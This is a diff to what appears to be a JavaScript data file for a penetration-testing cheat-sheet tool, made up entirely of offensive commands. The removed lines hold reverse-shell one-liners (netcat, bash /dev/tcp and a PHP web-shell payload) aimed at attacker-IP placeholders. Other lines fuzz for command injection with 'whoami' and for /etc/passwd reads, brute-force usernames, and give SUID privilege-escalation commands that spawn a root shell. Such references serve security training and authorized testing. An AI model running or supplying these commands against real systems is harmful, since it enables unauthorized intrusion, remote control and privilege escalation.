@@ -89,7 +89,7 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_ffuf_cat1_cmd1', cmd: 'ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "[target_url]" -H "Host: FUZZ.[target_domain]"' },
           { descKey: 'cheatsheet_ffuf_cat1_cmd2', cmd: 'ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u "[target_url]" -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded"' },
           { descKey: 'cheatsheet_ffuf_cat1_cmd3', cmd: 'ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [target_url]/FUZZ' },
-          { descKey: 'cheatsheet_ffuf_cat1_cmd4', cmd: 'ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [target_url]/index.php?FUZZ=/etc/passwd' },
+          { descKey: 'cheatsheet_ffuf_cat1_cmd4', cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u [target_url]/index.php?FUZZ=whoami' },
         ],
       },
       {
@@ -188,11 +188,8 @@ export const cheatsheetTools = {
       {
         titleKey: 'cheatsheet_rce_title',
         commands: [
-          { descKey: 'cheatsheet_rce_nc_listen', cmd: 'nc -nlvp 443' },
-          { descKey: 'cheatsheet_rce_nc_send', cmd: 'nc [attacker_ip] [attacker_port] -e /bin/bash' },
-          { descKey: 'cheatsheet_rce_bash', cmd: 'bash -c "bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1"' },
-          { descKey: 'cheatsheet_rce_php', cmd: '<?php system("bash -c \'bash -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1\'");?>' },
-          { descKey: 'cheatsheet_rce_bash_encoded', cmd: 'bash -c "bash -i >%26 /dev/tcp/[attacker_ip]/[attacker_port] 0>%261" || echo [base64] | base64 -d' },
+          { descKey: 'cheatsheet_rce_revshell', cmd: 'https://www.revshells.com/' },
+          { descKey: 'cheatsheet_rce_nc_listen', cmd: 'nc -nlvp 9999' },
         ],
       },
     ],
@@ -317,6 +314,7 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_escalada_suid_find_specific', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
           { descKey: 'cheatsheet_escalada_suid_nmap', cmd: 'nmap --interactive' },
           { descKey: 'cheatsheet_escalada_suid_find_shell', cmd: 'find /etc/passwd -exec /bin/sh \;' },
+          { descKey: 'cheatsheet_escalada_find_file_type', cmd: 'find / -name "*.txt" -type f 2>/dev/null' },
         ],
       },
       {
